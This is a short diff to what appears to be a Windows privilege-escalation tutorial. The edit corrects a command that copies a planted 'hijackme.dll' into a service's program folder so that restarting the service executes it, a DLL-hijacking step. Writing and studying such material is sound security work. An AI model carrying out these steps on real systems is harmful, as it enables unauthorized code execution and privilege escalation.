@@ -170,7 +170,7 @@ Now, after transferring the DLL to the target host, copy the DLL to the path we 
 
 ```powershell
 # Hijack the DLL 
-copy /y c:\Temp\hijackme.exe "C:\Program Files\Folder Permissions Service\hijackme.dll"
+copy /y c:\Temp\hijackme.dll "C:\Program Files\Folder Permissions Service\hijackme.dll"
 ```
 
 Finaly, restart the service to trigger the execution
